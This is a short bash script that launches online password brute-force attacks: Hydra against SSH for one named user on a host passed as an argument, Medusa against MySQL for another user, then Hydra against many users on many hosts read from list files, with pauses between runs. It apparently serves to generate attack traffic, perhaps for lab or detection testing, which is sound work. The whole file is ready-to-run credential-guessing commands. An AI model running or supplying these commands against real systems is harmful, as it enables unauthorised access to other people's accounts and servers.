#!/bin/bash

# Try to crack single user on single host with Hydra
echo "Hydra: SSH, 1 user, 1 host..."
hydra -ljdoe -P passcrack/passlist $1 ssh

echo "Waiting 30 seconds..."
sleep 30

# Try to crack MySQL single user on single host with Medusa
echo "Medusa: MySQL, 1 user, 1 host..."
medusa -ugriffisd -P passcrack/passlist -h $1 -Mmysql

echo "Waiting 30 seconds..."
sleep 30

# Try to crack multiple users on multiple hosts with Hydra
echo "Hydra: SSH, many users, many hosts..."
hydra -L passcrack/userlist -P passcrack/passlist -M passcrack/hostlist ssh
